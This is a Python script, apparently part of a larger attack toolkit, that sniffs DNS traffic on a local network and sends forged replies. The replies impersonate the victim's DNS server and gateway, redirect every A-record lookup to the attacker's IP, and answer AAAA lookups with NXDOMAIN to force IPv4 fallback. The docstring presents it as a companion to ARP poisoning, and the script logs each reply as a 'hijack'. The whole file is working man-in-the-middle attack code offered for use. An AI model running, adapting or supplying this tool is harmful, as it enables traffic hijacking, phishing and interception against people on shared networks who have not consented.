"""force_pop.py -- standalone DNS responder + diagnostics.

Sniffs UDP/53 on the wire and crafts spoofed replies pointing every A query
to our_ip. Source IP of the spoofed reply matches the original destination
(so the victim's stack accepts it as if from its configured DNS server).

This is the L2-level fix for the kernel-drops-DNS problem when ARP poison
is in effect: the victim's DNS dest IP isn't ours, so a bound port-53
listener never sees the packet -- but a raw sniffer does.

Usage:
    python scripts/force_pop.py "Wi-Fi 2" 192.168.0.22 04:d3:b0:14:79:0e
"""
from __future__ import annotations
import socket, struct, sys, time, threading
from collections import Counter
from scapy.all import (  # type: ignore
    sniff, sendp, conf, Ether, IP, IPv6, UDP, DNS, DNSQR, DNSRR,
)

iface = sys.argv[1] if len(sys.argv) > 1 else "Wi-Fi 2"
our_ip = sys.argv[2] if len(sys.argv) > 2 else "192.168.0.22"
our_mac = sys.argv[3].lower() if len(sys.argv) > 3 else "04:d3:b0:14:79:0e"

stats: Counter[str] = Counter()
last_print = time.time()

def craft_reply(pkt) -> bytes | None:
    """Return Ether-framed spoofed DNS reply, or None if not applicable."""
    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
        return None
    if not pkt.haslayer(DNSQR):
        return None
    qname = pkt[DNSQR].qname
    qtype = pkt[DNSQR].qtype

    # Only spoof A (1) and AAAA (28) -- AAAA we NXDOMAIN to force v4 fallback
    if qtype not in (1, 28):
        return None

    # IPv4 path
    if pkt.haslayer(IP):
        ip_src_real = pkt[IP].dst   # the DNS server the victim *thought* it was talking to
        ip_dst = pkt[IP].src        # back to victim
        udp_sport = pkt[UDP].dport  # 53
        udp_dport = pkt[UDP].sport  # ephemeral
        eth_src = pkt[Ether].dst    # back as if from gateway
        eth_dst = pkt[Ether].src
        if qtype == 1:
            an = DNSRR(rrname=qname, type="A", rclass="IN", ttl=30, rdata=our_ip)
            dns = DNS(id=pkt[DNS].id, qr=1, aa=1, rd=pkt[DNS].rd, ra=1,
                      qd=pkt[DNSQR], an=an)
        else:
            # AAAA -> NXDOMAIN (rcode=3) so iOS falls back to v4
            dns = DNS(id=pkt[DNS].id, qr=1, aa=1, rd=pkt[DNS].rd, ra=1,
                      rcode=3, qd=pkt[DNSQR])
        reply = (
            Ether(src=eth_src, dst=eth_dst)
            / IP(src=ip_src_real, dst=ip_dst)
            / UDP(sport=udp_sport, dport=udp_dport)
            / dns
        )
        return reply
    return None

def on_pkt(pkt):
    global last_print
    try:
        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
            return
        if not pkt.haslayer(IP):
            return
        # Skip our own queries
        if pkt[IP].src == our_ip:
            return
        src = pkt[IP].src
        qname = pkt[DNSQR].qname.decode("ascii", "replace").rstrip(".") if pkt.haslayer(DNSQR) else "?"
        qtype = pkt[DNSQR].qtype if pkt.haslayer(DNSQR) else 0
        reply = craft_reply(pkt)
        if reply is not None:
            sendp(reply, iface=iface, verbose=False)
            stats[src] += 1
            print(f"[hijack] {src:15} {('A' if qtype==1 else 'AAAA'):4} {qname:40} -> {our_ip if qtype==1 else 'NXDOMAIN'}")
        if time.time() - last_print > 10:
            last_print = time.time()
            print(f"[stat] hijacks-by-src: {dict(stats)}")
    except Exception as e:
        print("err:", e)

print(f"[force_pop] iface={iface!r} our_ip={our_ip} our_mac={our_mac}")
print(f"[force_pop] sniffing UDP/53. Ctrl-C to stop.")
sniff(iface=iface, prn=on_pkt, store=False, filter="udp port 53")
